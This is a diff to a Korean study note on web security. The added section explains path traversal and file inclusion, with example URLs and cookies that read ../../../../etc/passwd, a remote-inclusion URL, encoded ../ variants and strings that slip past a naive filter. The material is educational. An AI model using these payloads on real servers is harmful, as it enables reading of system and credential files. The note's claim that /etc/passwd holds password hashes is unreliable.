@@ -56,6 +56,72 @@
 - 웹 서버 운영시 특정 디렉터리에 초기화 파일이 없을 경우 `(index.html, default.html, ...etc)` 해당 디렉터리의 파일 
   리스트를 브라우저에게 보여주게 되는 보안약점
 - 구조 파악 & 민감정보가 포함된 파일 노출 -> 보안 위협
+- ../../../../etc/passwd : user들의 비밀번호의 해시값이 저장되어있는 파일
+
+>**공격 방법**
+>
+>http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
+>
+>쿠키를 이용한 진단 : Cookie: USER=1826cc8f;PSTYLE=../../../../etc/passwd
+>
+>해당 공격은 파일을 포함시키거나 웹 사이트 외부에 있는 스크립트 파일을 포함시키는 것도 가능하다.
+>
+>http://example.com/index.php?file=http://www.owasp.org/malicioustxt
+>
+>
+>
+>**OS별 공격방법**
+>
+>일반적인 공격구문은 필터링 되기 때문에 인코딩을 통한 공격을 진행할 필요 또한 있다. (ex: %00 -> null )
+>
+>Unix-like OS:
+>
+>`root directory: "/"`
+>`directory separator: "/"
+>
+>
+>
+>Windows OS Shell:
+>
+>`root directory: "[drive letter]:\"`
+>
+>`directory separator: "\" or "/"`
+>
+>
+>
+>- **URL encoding and double URL encoding**
+>
+>`%2e%2e%2f` -> `../`
+>
+>`%2e%2e/` -> `../`
+>
+>`..%2f` -> ../
+>
+>`%2e%2e%5c` -> `..\`
+>
+>`..%5c` -> `..\`
+>
+>`%252e%252e%255c` -> `..\`
+>
+>
+>
+>아래와 같은 필터링 로직이 있다고 가정해보자.
+>
+>```java
+>filename = Request.QueryString("file");
+>Replace(filename, "/", "\");
+>Replace(filename, "..\","");
+>```
+>
+>위와 같은 필터링 로직은 아래 구문을 통해 우회가 가능하다.
+>
+>```html
+>file=....//....//boot.ini
+>file=....\\....\\boot.ini
+>file=..\..\boot.ini
+>```
+>
+>
 
 
 
@@ -164,3 +230,7 @@
 - 취약점 : 위협에 의해 손실이 발생하게 되는 약점
 
 **취약점이 존재하지 않는다면 위협은 위험이 될 수 없다.**
+
+
+
+../../../../etc/passwd : user들의 비밀번호의 해시값이 저장되어있는 파일
